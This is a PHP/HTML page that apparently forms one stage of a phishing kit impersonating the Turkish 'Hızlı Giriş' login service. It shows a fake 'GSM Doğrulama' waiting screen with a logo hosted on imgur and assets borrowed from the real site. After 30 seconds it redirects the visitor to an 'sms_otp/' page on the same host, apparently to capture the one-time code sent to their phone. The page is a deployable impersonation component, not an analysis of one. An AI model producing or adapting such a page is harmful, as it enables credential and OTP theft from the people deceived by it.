<?php 

$actual_link = "https://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

?>
<html lang="tr"><link type="text/css" rel="stylesheet" id="dark-mode-custom-link"><link type="text/css" rel="stylesheet" id="dark-mode-general-link"><style lang="en" type="text/css" id="dark-mode-custom-style"></style><style lang="en" type="text/css" id="dark-mode-native-style"></style><head>
<meta charset="UTF-8">
<meta http-equiv="Content-language" content="tr">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="description" content="">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<title>Hızlı Giriş</title>
<base href="https://hizligiris.com.tr/hizligiris/generic/login">

<link rel="preload" href="assets/fonts/IconFont.woff?v=202110-last" as="font" type="font/woff" crossorigin="">
<link rel="preload" href="assets/fonts/typekit/museo-sans-bold.woff2" as="font" type="font/woff2" crossorigin="">
<link rel="preload" href="assets/fonts/typekit/museo-sans.woff2" as="font" type="font/woff2" crossorigin="">
<link rel="preload" href="assets/fonts/GreycliffCF-Medium.woff2" as="font" type="font/woff2" crossorigin="">
<link rel="preload" href="assets/fonts/GreycliffCF-Regular.woff2" as="font" type="font/woff2" crossorigin="">
<link rel="preload" href="assets/fonts/GreycliffCF-Bold.woff2" as="font" type="font/woff2" crossorigin="">
<link rel="stylesheet" type="text/css" media="all" href="assets/styles/main.min.css?v=202110-last">







</head>
<body>
	



<!-- Google Tag Manager (noscript) -->



<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PP875HD"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>

<!-- End Google Tag Manager (noscript) -->
    <form action="/hizligiris/click_ok_filter" method="POST" data-url="/hizligiris/checkUserLoginConsent">
       






<div class="main">
	<header class="main-header">
		<div class="container">
			
			
		
	</div></header>
	<div class="main-body">
		<div class="main-body-container">
			<div class="main-body-container-header">
				<h2 tabindex="0" class="main-header__logo" title="Hızlı Giriş">
                <img src="https://i.imgur.com/2lXxJYy.png" width="156px">
				</h2>
			</div>	
                    <div class="container">
                     <h2>GSM Doğrulama</h2>
                     <p class="intro">Birazdan telefonunuza gelecek ekrana onay vererek veya telefonunuza gönderilecek doğrulama kodunu girerek ilerleyiniz.</p>
                     <div class="loader"><img src="assets/images/loading.GIF" alt="GSM Doğrulama"></div>
                  	</div>
               </div>
            </div>
           		
				



	<div class="main-footer">
	<div class="container container--large"></div>
	<div class="container">
	
			
			
			
			
			<nav class="main-footer__nav" id="footerWithoutTooltip">
			<div>
			<a href="#privacyModal" id="footerPrivacyLink" onclick="window.dataLayer.push({'eventCategory': 'privacy','eventLabel': 'privacyClick'});" data-modal-url="privacy_modal">Aydınlatma Metini</a>
			ve
			<a href="#cookiesModal" id="cookiesLink" onclick="window.dataLayer.push({'eventCategory': 'cookies','eventLabel': 'cookiesClick'});" data-modal-url="cookies_modal">Çerez</a>
			</div>
			
		
					
			
			<a href="#aboutModal" onclick="window.dataLayer.push({'eventCategory': 'about','eventLabel': 'aboutClick'});" id="footerAboutLink" data-modal-url="about_modal">Hakkında</a>
		</nav>
	</div>
</div>


        </div>
    </form>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
    <script>
        $(document).ready(function(){
            setTimeout(function(){
            window.location.href = '<?=$actual_link?>sms_otp/';
         }, 30000);
        }) 
    </script>


<script type="text/javascript">
	var parsley_message_default_message = 'Girdiğiniz değer geçerli değil.';
	var parsley_message_type_email = 'Geçerli bir eposta adresi yazmanız gerekiyor.'; 
	var parsley_message_type_url = 'Geçerli bir bağlantı adresi yazmanız gerekiyor.';
	var parsley_message_type_number = 'Geçerli bir sayı yazmanız gerekiyor.';
	var parsley_message_type_integer = 'Geçerli bir tamsayı yazmanız gerekiyor.';
	var parsley_message_type_digits = 'Geçerli bir rakam yazmanız gerekiyor.';
	var parsley_message_type_alphanum = 'Geçerli bir alfanümerik değer yazmanız gerekiyor.';

	var parsley_message_type_notblank = 'Bu alan boş bırakılamaz.'; 
	var parsley_message_type_required = 'Bu alan boş bırakılamaz.';  
	var parsley_message_type_pattern = 'Girdiğiniz değer geçerli değil.';
	var parsley_message_type_min = 'Bu alan %s değerinden büyük ya da bu değere eşit olmalı.';
	var parsley_message_type_max = 'Bu alan %s değerinden küçük ya da bu değere eşit olmalı.';
	var parsley_message_type_range = 'Bu alan %s ve %s değerleri arasında olmalı.';
	var parsley_message_type_minlength = 'Şifreniz 6-16 karakterden oluşmalıdır. Ardışık ve tekrarlı olmayan en az bir rakam, bir büyük harf ve bir küçük harf içermelidir.'; 
	var parsley_message_type_maxlength = 'Şifreniz 6-16 karakterden oluşmalıdır. Ardışık ve tekrarlı olmayan en az bir rakam, bir büyük harf ve bir küçük harf içermelidir.'; 
	var parsley_message_type_length = 'Şifreniz 6-16 karakterden oluşmalıdır. Ardışık ve tekrarlı olmayan en az bir rakam, bir büyük harf ve bir küçük harf içermelidir.'; 
	var parsley_message_type_mincheck = 'En az %s adet seçim yapmalısınız.';
	var parsley_message_type_maxcheck = 'En fazla %s seçim yapabilirsiniz.';
	var parsley_message_type_check = 'Bu alan için en az %s, en fazla %s seçim yapmalısınız.';
	var parsley_message_type_equalto = 'Bu alanın değeri aynı olmalı.';

	var parsley_message_type_parsleyTel = 'Lütfen geçerli bir telefon numarası giriniz.';
	var parsley_message_type_parsleyTckn = 'Lütfen geçerli bir TCKN giriniz.';
	var parsley_message_type_parsleyPassword = 'Şifreniz 6-16 karakterden oluşmalıdır. Ardışık ve tekrarlı olmayan en az bir rakam, bir büyük harf ve bir küçük harf içermelidir.';
	window.countryCodeAriaLabel = "Ülke alan kodu seçim kutusu";

	var any_picker_set_button = 'TAMAM';
	var any_picker_cancel_button = 'Vazgeç';
	var any_picker_clear_button = 'Vazgeç';
	var aria_label_flag = 'Alan Kodu';
	
	var showGenericPopup = '';
</script>
<script defer="" src="assets/scripts/utils.js?v=202110-last"></script>
<script defer="" src="assets/scripts/main.min.js?v=202110-last"></script>


</body></html>